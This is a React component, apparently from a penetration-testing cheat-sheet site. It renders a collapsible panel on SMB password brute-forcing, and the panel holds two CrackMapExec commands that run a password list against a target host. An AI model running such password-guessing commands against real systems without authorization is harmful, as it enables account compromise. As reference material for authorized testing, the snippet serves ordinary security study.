import {
    Typography,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    Box,
  } from "@mui/material";
  import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
  import SyntaxHighlighter from "react-syntax-highlighter";
  import TreeView from '@mui/lab/TreeView';
import { TreeItem } from "@mui/lab";
import ChevronRightIcon from '@mui/icons-material/ChevronRight';
  
  interface IProps {
    title: string;
  }
  
  const SMB_Brute_Force = ({ title }: IProps) => {

    return (
      <>
        {" "}
        <Accordion sx={{ backgroundColor: "primary.main" }}>
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel1a-content"
            id="panel1a-header"
          >
            <Typography>{title}</Typography>
          </AccordionSummary>
          <AccordionDetails
            sx={{ backgroundColor: "primary.background_accordian" }}
          >
            <Typography
              sx={{
                color: "primary.main",
              }}
            >
              <Box pt={5} />
              <Typography variant="h6">
                    Description
                </Typography>

              <Typography>
              We can bruteforce passwords using CrackMapExec (CME).
               </Typography>
               <Box pt={5}></Box>
              <SyntaxHighlighter className="syntax" language="bash">
              {"crackmapexec smb {IP} -u 'marie@shelled.io' -p /tmp/passwords.txt"}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
              <SyntaxHighlighter className="syntax" language="bash">
              {"crackmapexec smb {IP} -u 'marie@shelled.io' -p /tmp/passwords.txt --local-auth"}
            </SyntaxHighlighter>
            </Typography>
          </AccordionDetails>
        </Accordion>
      </>
    );
  };

  
  export default SMB_Brute_Force;
  